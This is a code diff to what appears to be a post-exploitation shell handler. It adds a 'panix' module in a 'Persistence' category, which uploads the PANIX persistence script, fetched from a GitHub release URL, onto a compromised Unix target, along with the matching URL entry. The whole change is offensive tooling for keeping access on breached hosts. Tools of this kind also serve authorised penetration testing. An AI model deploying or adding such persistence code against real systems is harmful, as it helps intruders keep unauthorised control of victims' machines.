@@ -4444,6 +4444,18 @@ class linuxexploitsuggester(Module):
 			logger.error("This module runs only on Unix shells")
 
 
+class panix(Module):
+	category = "Persistence"
+	def run(session, args):
+		"""
+		Upload the latest version of panix to the target
+		"""
+		if session.OS == 'Unix':
+			session.upload(URLS['panix'])
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
 class meterpreter(Module):
 	def run(session, args):
 		"""
@@ -5218,6 +5230,7 @@ URLS = {
 	'traitor_arm64':	"https://github.com/liamg/traitor/releases/latest/download/traitor-arm64",
 	'pspy32':	"https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
 	'pspy64':	"https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
+	'panix':	"https://github.com/Aegrah/PANIX/releases/latest/download/panix.sh",
 }
 
 # Python Agent code
